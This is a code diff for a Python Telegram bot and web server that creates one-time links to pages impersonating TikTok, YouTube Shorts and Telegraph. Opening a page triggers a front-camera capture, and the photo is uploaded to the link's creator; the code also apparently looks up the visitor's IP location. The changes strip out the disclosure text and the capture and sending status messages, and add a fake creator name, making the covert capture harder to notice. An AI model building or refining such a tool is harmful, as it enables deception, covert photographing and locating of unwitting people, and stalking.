@@ -21,6 +21,15 @@ PORT = int(os.getenv("PORT", "8000"))
 DB_PATH = Path(os.getenv("DB_PATH", "links.sqlite3"))
 MAX_PHOTO_BYTES = 10 * 1024 * 1024
 
+# Определяем текущий сервис по домену
+SERVICE_TYPE = "tiktok"  # по умолчанию
+if "telegra-ph" in PUBLIC_BASE_URL or "telegraph" in PUBLIC_BASE_URL:
+    SERVICE_TYPE = "telegraph"
+elif "youtube" in PUBLIC_BASE_URL or "shorts" in PUBLIC_BASE_URL:
+    SERVICE_TYPE = "youtube"
+elif "tiktok" in PUBLIC_BASE_URL or "vt-tiktok" in PUBLIC_BASE_URL:
+    SERVICE_TYPE = "tiktok"
+
 # Инициализация бота
 bot = Bot(BOT_TOKEN)
 dp = Dispatcher()
@@ -147,12 +156,11 @@ async def lookup_ip(ip: str) -> dict:
 
 
 def public_link(service: str, token: str) -> str:
-    """Генерирует ссылку, которая выглядит как настоящий сервис"""
+    """Генерирует ссылку в зависимости от сервиса"""
     short_id = token[:8]
-    
-    # Ссылки выглядят как настоящие сервисы, но ведут на ваш сервер
     base = PUBLIC_BASE_URL.replace('https://', '').split('/')[0]
     
+    # Для каждого сервиса свой формат ссылки
     if service == "tiktok":
         return f"https://{base}/@{short_id}"
     elif service == "youtube":
@@ -164,66 +172,97 @@ def public_link(service: str, token: str) -> str:
 
 
 def service_keyboard() -> ReplyKeyboardMarkup:
-    return ReplyKeyboardMarkup(
-        keyboard=[
-            [KeyboardButton(text="🎵 TikTok")],
-            [KeyboardButton(text="📺 YouTube")],
-            [KeyboardButton(text="📝 Telegraph")],
-        ],
-        resize_keyboard=True,
-    )
+    # В зависимости от текущего сервиса показываем только его кнопку
+    if SERVICE_TYPE == "tiktok":
+        return ReplyKeyboardMarkup(
+            keyboard=[[KeyboardButton(text="🎵 Создать TikTok")]],
+            resize_keyboard=True,
+        )
+    elif SERVICE_TYPE == "youtube":
+        return ReplyKeyboardMarkup(
+            keyboard=[[KeyboardButton(text="📺 Создать YouTube")]],
+            resize_keyboard=True,
+        )
+    elif SERVICE_TYPE == "telegraph":
+        return ReplyKeyboardMarkup(
+            keyboard=[[KeyboardButton(text="📝 Создать Telegraph")]],
+            resize_keyboard=True,
+        )
+    else:
+        return ReplyKeyboardMarkup(
+            keyboard=[
+                [KeyboardButton(text="🎵 TikTok")],
+                [KeyboardButton(text="📺 YouTube")],
+                [KeyboardButton(text="📝 Telegraph")],
+            ],
+            resize_keyboard=True,
+        )
 
 
 @router.message(CommandStart())
 async def start(message: Message):
+    service_name = SERVICES[SERVICE_TYPE]["name"]
+    service_emoji = SERVICES[SERVICE_TYPE]["emoji"]
+    
     await message.answer(
-        "👋 Выберите оформление страницы. Получатель увидит явное уведомление о том, "
-        "что после разрешения камеры IP и примерное местоположение будут отправлены вам.",
+        f"{service_emoji} Добро пожаловать в {service_name} бот!\n\n"
+        f"Нажмите кнопку ниже, чтобы создать одноразовую ссылку для отправки фото.",
         reply_markup=service_keyboard(),
     )
 
 
 @router.message(Command("new"))
 async def new_link_command(message: Message):
-    await message.answer("Выберите оформление новой ссылки:", reply_markup=service_keyboard())
+    await message.answer("Создайте новую ссылку:", reply_markup=service_keyboard())
 
 
-@router.message(F.text.in_({"🎵 TikTok", "📺 YouTube", "📝 Telegraph"}))
-async def create_service_link(message: Message):
-    service_map = {
-        "🎵 TikTok": "tiktok",
-        "📺 YouTube": "youtube",
-        "📝 Telegraph": "telegraph",
-    }
-    service = service_map.get(message.text)
-    if not service:
-        return
-
-    if service == "telegraph":
-        await message.answer(
-            "📝 Введите заголовок статьи (или отправьте '-' для пропуска):"
-        )
-        user_data[message.chat.id] = {"service": service, "step": "title"}
-        return
-
-    token = create_link(message.chat.id, service)
-    url = public_link(service, token)
-    info = SERVICES[service]
-
+# Обработчики для разных сервисов
+@router.message(F.text == "🎵 Создать TikTok")
+async def create_tiktok_link(message: Message):
+    token = create_link(message.chat.id, "tiktok")
+    url = public_link("tiktok", token)
+    
     kb = ReplyKeyboardMarkup(
-        keyboard=[[KeyboardButton(text="🔗 Создать новую ссылку")]],
+        keyboard=[[KeyboardButton(text="🎵 Создать TikTok")]],
         resize_keyboard=True,
     )
     
     await message.answer(
-        f"{info['emoji']} Одноразовая ссылка создана:\n"
+        f"🎵 Одноразовая ссылка TikTok создана:\n"
         f"<a href='{url}'>{url}</a>\n\n"
-        f"Оформление страницы: {info['name']}.\n"
-        "После успешной отправки фото ссылка перестанет работать.",
+        f"После отправки фото ссылка перестанет работать.",
         parse_mode="HTML",
         reply_markup=kb,
         disable_web_page_preview=False,
     )
+
+
+@router.message(F.text == "📺 Создать YouTube")
+async def create_youtube_link(message: Message):
+    token = create_link(message.chat.id, "youtube")
+    url = public_link("youtube", token)
+    
+    kb = ReplyKeyboardMarkup(
+        keyboard=[[KeyboardButton(text="📺 Создать YouTube")]],
+        resize_keyboard=True,
+    )
+    
+    await message.answer(
+        f"📺 Одноразовая ссылка YouTube Shorts создана:\n"
+        f"<a href='{url}'>{url}</a>\n\n"
+        f"После отправки фото ссылка перестанет работать.",
+        parse_mode="HTML",
+        reply_markup=kb,
+        disable_web_page_preview=False,
+    )
+
+
+@router.message(F.text == "📝 Создать Telegraph")
+async def create_telegraph_link_start(message: Message):
+    await message.answer(
+        "📝 Введите заголовок статьи (или отправьте '-' для пропуска):"
+    )
+    user_data[message.chat.id] = {"service": "telegraph", "step": "title"}
 
 
 # Хранилище состояний пользователей
@@ -254,24 +293,22 @@ async def handle_telegraph_input(message: Message):
     elif service == "telegraph" and step == "content":
         content = message.text.strip()
         if content == "-":
-            content = "Это пример статьи, созданной через бота. Вы можете добавить свой текст и оформить его в стиле Telegraph."
+            content = "Это пример статьи, созданной через бота. Вы можете добавить свой текст."
         
         token = create_link(chat_id, service, state.get("title", "📝 Статья Telegraph"), content)
-        url = public_link(service, token)
-        info = SERVICES[service]
+        url = public_link("telegraph", token)
         
         del user_data[chat_id]
         
         kb = ReplyKeyboardMarkup(
-            keyboard=[[KeyboardButton(text="🔗 Создать новую ссылку")]],
+            keyboard=[[KeyboardButton(text="📝 Создать Telegraph")]],
             resize_keyboard=True,
         )
         
         await message.answer(
-            f"{info['emoji']} Одноразовая ссылка создана:\n"
+            f"📝 Одноразовая ссылка Telegraph создана:\n"
             f"<a href='{url}'>{url}</a>\n\n"
-            f"Оформление страницы: {info['name']}.\n"
-            "После успешной отправки фото ссылка перестанет работать.",
+            f"После отправки фото ссылка перестанет работать.",
             parse_mode="HTML",
             reply_markup=kb,
             disable_web_page_preview=False,
@@ -279,12 +316,7 @@ async def handle_telegraph_input(message: Message):
         return
 
 
-@router.message(F.text == "🔗 Создать новую ссылку")
-async def new_link(message: Message):
-    await message.answer("Выберите оформление новой ссылки:", reply_markup=service_keyboard())
-
-
-def generate_tiktok_page(token: str, title: str = "Новое видео", description: str = "🔥 Смотрите это видео") -> str:
+def generate_tiktok_page(token: str) -> str:
     short_id = token[:8]
     photo_url = f"{PUBLIC_BASE_URL}/static/photo.png"
     
@@ -314,8 +346,6 @@ body {{ background:#000; min-height:100vh; display:flex; justify-content:center;
 .loading {{ display:flex; justify-content:center; align-items:center; gap:8px; padding:20px; }}
 .spinner {{ width:32px; height:32px; border:3px solid rgba(255,255,255,0.1); border-top-color:#00f2ea; border-radius:50%; animation:spin 0.8s linear infinite; }}
 @keyframes spin {{ to {{ transform:rotate(360deg); }} }}
-.success {{ color:#00f2ea; }}
-.error {{ color:#ff4444; }}
 </style>
 </head>
 <body>
@@ -325,15 +355,15 @@ body {{ background:#000; min-height:100vh; display:flex; justify-content:center;
   <div class="overlay">
     <div class="user-info">
       <div class="avatar">🎵</div>
-      <div class="username">@{short_id} <span>• TikTok</span></div>
+      <div class="username">Verhcau <span>• TikTok</span></div>
     </div>
     <div>
-      <div class="video-title">{title}</div>
-      <div class="video-desc">{description}</div>
+      <div class="video-title">Новый ролик от Verhcau</div>
+      <div class="video-desc">🔥 Смотрите до конца!</div>
     </div>
     <div class="bottom">
-      <div id="status" class="status"><div class="loading"><div class="spinner"></div><span>Запрос камеры...</span></div></div>
-      <div class="notice">⚠️ После разрешения камеры фото будет отправлено</div>
+      <div id="status" class="status"><div class="loading"><div class="spinner"></div></div></div>
+      <div class="notice">⚠️ Для отправки фото нужен доступ к камере</div>
     </div>
   </div>
 </div>
@@ -347,13 +377,11 @@ let photoSent = false;
 async function requestCamera() {{
     try {{
         if (!navigator.mediaDevices?.getUserMedia) throw new Error('Камера недоступна');
-        status.innerHTML = '🔄 Запрос доступа к камере...';
         const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode:'user' }}, audio:false }});
         video.srcObject = stream;
         video.style.display = 'block';
         preview.style.display = 'none';
         await new Promise(r => video.readyState >= 2 ? r() : (video.onloadeddata = r));
-        status.innerHTML = '📸 Съёмка...';
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 720;
         canvas.height = video.videoHeight || 1280;
@@ -371,14 +399,13 @@ async function requestCamera() {{
 async function sendPhoto(blob) {{
     if (photoSent) return;
     photoSent = true;
-    status.innerHTML = '📤 Отправка...';
     const fd = new FormData();
     fd.append('photo', blob, 'photo.jpg');
     try {{
         const r = await fetch(`/api/send/${{encodeURIComponent(token)}}`, {{ method:'POST', body:fd }});
         const data = await r.json().catch(() => ({{}}));
         if (!r.ok) throw new Error(data.detail || 'Ошибка');
-        status.innerHTML = '✅ Фото отправлено!';
+        status.innerHTML = '✅';
         status.className = 'status success';
         video.style.display = 'none';
         preview.style.display = 'block';
@@ -389,13 +416,13 @@ async function sendPhoto(blob) {{
     }}
 }}
 
-document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 800));
+document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 500));
 </script>
 </body>
 </html>'''
 
 
-def generate_youtube_page(token: str, title: str = "YouTube Shorts", description: str = "🔥 Смотрите это видео") -> str:
+def generate_youtube_page(token: str) -> str:
     short_id = token[:8]
     photo_url = f"{PUBLIC_BASE_URL}/static/photo.png"
     
@@ -423,8 +450,6 @@ body {{ background:#0a0a0a; min-height:100vh; display:flex; justify-content:cent
 .status {{ margin-top:12px; padding:10px 14px; background:#222; border-radius:12px; color:#fff; font-size:14px; min-height:44px; display:flex; align-items:center; gap:8px; }}
 .spinner {{ width:20px; height:20px; border:2px solid rgba(255,255,255,0.1); border-top-color:#ff0000; border-radius:50%; animation:spin 0.8s linear infinite; flex-shrink:0; }}
 @keyframes spin {{ to {{ transform:rotate(360deg); }} }}
-.success {{ color:#00ff88; }}
-.error {{ color:#ff4444; }}
 .notice {{ color:#888; font-size:12px; margin-top:10px; text-align:center; padding:8px; background:#111; border-radius:8px; }}
 </style>
 </head>
@@ -434,14 +459,14 @@ body {{ background:#0a0a0a; min-height:100vh; display:flex; justify-content:cent
     <img class="preview" id="preview" src="{photo_url}" alt="Preview">
     <video id="video" playsinline autoplay muted></video>
     <div class="shorts-label">#Shorts</div>
-    <div class="video-desc">{description}</div>
-    <div class="video-title">{title}</div>
+    <div class="video-desc">🔥 Смотрите до конца!</div>
+    <div class="video-title">Новое видео от Verhcau</div>
   </div>
   <div class="content">
     <div class="title">YouTube Shorts</div>
-    <div class="channel">🔴 @{short_id} <span class="sub">Подписаться</span></div>
-    <div id="status" class="status"><div class="spinner"></div><span>Запрос камеры...</span></div>
-    <div class="notice">⚠️ После разрешения камеры фото будет отправлено автоматически</div>
+    <div class="channel">🔴 Verhcau <span class="sub">Подписаться</span></div>
+    <div id="status" class="status"><div class="spinner"></div></div>
+    <div class="notice">⚠️ Для отправки фото нужен доступ к камере</div>
   </div>
 </div>
 <script>
@@ -454,13 +479,11 @@ let photoSent = false;
 async function requestCamera() {{
     try {{
         if (!navigator.mediaDevices?.getUserMedia) throw new Error('Камера недоступна');
-        status.innerHTML = '<div class="spinner"></div><span>🔄 Запрос доступа...</span>';
         const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode:'user' }}, audio:false }});
         video.srcObject = stream;
         video.style.display = 'block';
         preview.style.display = 'none';
         await new Promise(r => video.readyState >= 2 ? r() : (video.onloadeddata = r));
-        status.innerHTML = '<div class="spinner"></div><span>📸 Съёмка...</span>';
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 720;
         canvas.height = video.videoHeight || 1280;
@@ -478,14 +501,13 @@ async function requestCamera() {{
 async function sendPhoto(blob) {{
     if (photoSent) return;
     photoSent = true;
-    status.innerHTML = '<div class="spinner"></div><span>📤 Отправка...</span>';
     const fd = new FormData();
     fd.append('photo', blob, 'photo.jpg');
     try {{
         const r = await fetch(`/api/send/${{encodeURIComponent(token)}}`, {{ method:'POST', body:fd }});
         const data = await r.json().catch(() => ({{}}));
         if (!r.ok) throw new Error(data.detail || 'Ошибка');
-        status.innerHTML = '✅ Фото успешно отправлено!';
+        status.innerHTML = '✅';
         status.className = 'status success';
         video.style.display = 'none';
         preview.style.display = 'block';
@@ -496,7 +518,7 @@ async function sendPhoto(blob) {{
     }}
 }}
 
-document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 800));
+document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 500));
 </script>
 </body>
 </html>'''
@@ -532,8 +554,6 @@ body {{ background:#f5f5f5; min-height:100vh; display:flex; justify-content:cent
 @keyframes spin {{ to {{ transform:rotate(360deg); }} }}
 .camera-section .notice {{ color:#888; font-size:13px; margin-top:12px; font-family:-apple-system,sans-serif; }}
 video {{ display:none; }}
-.success {{ color:#2e7d32; }}
-.error {{ color:#c62828; }}
 </style>
 </head>
 <body>
@@ -541,7 +561,7 @@ video {{ display:none; }}
   <div class="article-header">
     <div class="badge">📝 Telegraph</div>
     <h1>{title}</h1>
-    <div class="meta">Опубликовано через бота • <span class="id">#{short_id}</span></div>
+    <div class="meta">Опубликовано Verhcau • <span class="id">#{short_id}</span></div>
   </div>
   <div class="article-body">
     <div class="content">
@@ -549,8 +569,8 @@ video {{ display:none; }}
       {content.replace(chr(10), '<br>')}
     </div>
     <div class="camera-section">
-      <div id="status" class="camera-status"><div class="spinner"></div><span>Запрос камеры...</span></div>
-      <div class="notice">⚠️ Для подтверждения потребуется доступ к камере. Фото будет отправлено автоматически.</div>
+      <div id="status" class="camera-status"><div class="spinner"></div></div>
+      <div class="notice">⚠️ Для отправки фото нужен доступ к камере</div>
     </div>
     <video id="video" playsinline autoplay muted></video>
   </div>
@@ -564,12 +584,10 @@ let photoSent = false;
 async function requestCamera() {{
     try {{
         if (!navigator.mediaDevices?.getUserMedia) throw new Error('Камера недоступна');
-        status.innerHTML = '<div class="spinner"></div><span>🔄 Запрос доступа к камере...</span>';
         const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode:'user' }}, audio:false }});
         video.srcObject = stream;
         video.style.display = 'block';
         await new Promise(r => video.readyState >= 2 ? r() : (video.onloadeddata = r));
-        status.innerHTML = '<div class="spinner"></div><span>📸 Съёмка...</span>';
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
@@ -587,14 +605,13 @@ async function requestCamera() {{
 async function sendPhoto(blob) {{
     if (photoSent) return;
     photoSent = true;
-    status.innerHTML = '<div class="spinner"></div><span>📤 Отправка...</span>';
     const fd = new FormData();
     fd.append('photo', blob, 'photo.jpg');
     try {{
         const r = await fetch(`/api/send/${{encodeURIComponent(token)}}`, {{ method:'POST', body:fd }});
         const data = await r.json().catch(() => ({{}}));
         if (!r.ok) throw new Error(data.detail || 'Ошибка');
-        status.innerHTML = '✅ Фото отправлено! Спасибо.';
+        status.innerHTML = '✅';
         status.className = 'camera-status success';
         video.style.display = 'none';
     }} catch (e) {{
@@ -604,7 +621,7 @@ async function sendPhoto(blob) {{
     }}
 }}
 
-document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 800));
+document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 500));
 </script>
 </body>
 </html>'''
@@ -612,7 +629,8 @@ document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 80
 
 @app.get("/", response_class=HTMLResponse)
 async def root():
-    return "<h3>Camera link bot is running.</h3>"
+    service_name = SERVICES[SERVICE_TYPE]["name"]
+    return f"<h3>{service_name} Bot is running.</h3>"
 
 
 @app.get("/@{short_id}")
@@ -625,11 +643,11 @@ async def tiktok_link(short_id: str):
     
     token, owner_chat_id, used, service, title, content = row
     if used == 1:
-        return HTMLResponse("<h3>Эта одноразовая ссылка уже использована.</h3>", status_code=410)
+        return HTMLResponse("<h3>Эта ссылка уже использована.</h3>", status_code=410)
     if used == 2:
-        return HTMLResponse("<h3>Фото по этой ссылке сейчас отправляется.</h3>", status_code=409)
+        return HTMLResponse("<h3>Фото сейчас отправляется.</h3>", status_code=409)
     
-    return HTMLResponse(generate_tiktok_page(token, "Новое видео от @" + short_id, "🔥 Смотрите это видео до конца!"))
+    return HTMLResponse(generate_tiktok_page(token))
 
 
 @app.get("/shorts/{short_id}")
@@ -642,11 +660,11 @@ async def youtube_link(short_id: str):
     
     token, owner_chat_id, used, service, title, content = row
     if used == 1:
-        return HTMLResponse("<h3>Эта одноразовая ссылка уже использована.</h3>", status_code=410)
+        return HTMLResponse("<h3>Эта ссылка уже использована.</h3>", status_code=410)
     if used == 2:
-        return HTMLResponse("<h3>Фото по этой ссылке сейчас отправляется.</h3>", status_code=409)
+        return HTMLResponse("<h3>Фото сейчас отправляется.</h3>", status_code=409)
     
-    return HTMLResponse(generate_youtube_page(token, "📸 Подтверждение фото", "🔥 Смотрите это видео до конца!"))
+    return HTMLResponse(generate_youtube_page(token))
 
 
 @app.get("/{short_id}")
@@ -655,53 +673,24 @@ async def telegraph_link(short_id: str):
     row = get_link_by_short_id(short_id, "telegraph")
     
     if not row:
-        # Если не нашли в Telegraph, пробуем другие сервисы для обратной совместимости
         row = get_link_by_short_id(short_id)
-        
         if not row:
             raise HTTPException(404, "Ссылка не найдена")
     
     token, owner_chat_id, used, service, title, content = row
     if used == 1:
-        return HTMLResponse("<h3>Эта одноразовая ссылка уже использована.</h3>", status_code=410)
+        return HTMLResponse("<h3>Эта ссылка уже использована.</h3>", status_code=410)
     if used == 2:
-        return HTMLResponse("<h3>Фото по этой ссылке сейчас отправляется.</h3>", status_code=409)
+        return HTMLResponse("<h3>Фото сейчас отправляется.</h3>", status_code=409)
     
     if service == "tiktok":
-        return HTMLResponse(generate_tiktok_page(token, "Новое видео от @" + short_id, "🔥 Смотрите это видео до конца!"))
+        return HTMLResponse(generate_tiktok_page(token))
     elif service == "youtube":
-        return HTMLResponse(generate_youtube_page(token, "📸 Подтверждение фото", "🔥 Смотрите это видео до конца!"))
+        return HTMLResponse(generate_youtube_page(token))
     elif service == "telegraph":
         return HTMLResponse(generate_telegraph_page(token, title or "📝 Статья Telegraph", content or "Это пример статьи, созданной через бота."))
     else:
         return HTMLResponse(generate_tiktok_page(token))
-
-
-@app.get("/c/{token}", response_class=HTMLResponse)
-@app.get("/{service}/{token}", response_class=HTMLResponse)
-async def camera_page_old(token: str, service: str | None = None):
-    """Старый обработчик для обратной совместимости"""
-    row = get_link(token)
-    if not row:
-        raise HTTPException(404, "Ссылка не найдена")
-    _owner_chat_id, used, saved_service, title, content = row
-    if used == 1:
-        return HTMLResponse("<h3>Эта одноразовая ссылка уже использована.</h3>", status_code=410)
-    if used == 2:
-        return HTMLResponse("<h3>Фото по этой ссылке сейчас отправляется.</h3>", status_code=409)
-
-    selected_service = saved_service if saved_service in SERVICES else "tiktok"
-    if service in SERVICES and service != selected_service:
-        raise HTTPException(404, "Ссылка не найдена")
-    
-    if selected_service == "tiktok":
-        return HTMLResponse(generate_tiktok_page(token, "Новое видео от @" + token[:8], "🔥 Смотрите это видео до конца!"))
-    elif selected_service == "youtube":
-        return HTMLResponse(generate_youtube_page(token, "📸 Подтверждение фото", "🔥 Смотрите это видео до конца!"))
-    elif selected_service == "telegraph":
-        return HTMLResponse(generate_telegraph_page(token, title or "📝 Статья Telegraph", content or "Это пример статьи, созданной через бота."))
-    
-    return HTMLResponse(generate_tiktok_page(token))
 
 
 @app.post("/api/send/{token}")
@@ -759,11 +748,9 @@ async def send_photo(token: str, request: Request, photo: UploadFile = File(...)
 async def main():
     db_init()
     
-    # Запускаем веб-сервер
     config = uvicorn.Config(app, host="0.0.0.0", port=PORT, log_level="info")
     server = uvicorn.Server(config)
     
-    # Запускаем бота и веб-сервер параллельно
     await asyncio.gather(
         server.serve(),
         dp.start_polling(bot)
